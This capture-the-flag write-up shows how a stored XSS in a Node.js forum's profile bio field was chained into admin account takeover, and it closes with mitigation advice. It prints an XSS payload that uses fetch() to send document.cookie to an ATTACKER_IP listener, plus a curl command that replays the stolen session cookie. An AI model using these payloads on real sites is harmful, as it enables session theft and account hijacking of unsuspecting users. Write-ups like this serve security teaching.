---
title: "XSS to Account Takeover via Cookie Theft"
slug: "xss-account-takeover"
category: "web-application"
description: "Chaining a stored cross-site scripting vulnerability with cookie exfiltration to achieve full account takeover on a web application."
date: "2024-09-05"
---

## Overview

This web application challenge hosted a forum with user profiles. A stored XSS vulnerability in the profile bio field allowed injecting JavaScript that stole admin session cookies.

## Reconnaissance

The application was a Node.js forum with the following features:
- User registration and profiles
- Markdown-rendered bio field
- Admin panel at `/admin`

## Identifying the XSS

The bio field accepted HTML through the markdown renderer. Testing with:

```html
<img src=x onerror=alert(1)>
```

The alert fired when visiting the profile — confirmed stored XSS.

## Exploitation

### Setting Up the Listener

```bash
python3 -m http.server 8888
```

### Crafting the Payload

```html
<img src=x onerror="fetch('http://ATTACKER_IP:8888/?c='+document.cookie)">
```

This was saved in the bio field. When the admin bot visited the profile page (simulated in the CTF), the cookies were sent to my listener.

### Session Hijacking

```bash
curl -b "session=<stolen_cookie>" http://10.10.14.90/admin/flag
```

## Mitigation

- Sanitise all user-generated HTML output
- Implement Content Security Policy (CSP) headers
- Use `HttpOnly` and `Secure` flags on session cookies
- Consider using a library like DOMPurify for client-side sanitisation

## Tools Used

- Burp Suite
- Python HTTP server
- Browser DevTools
- curl
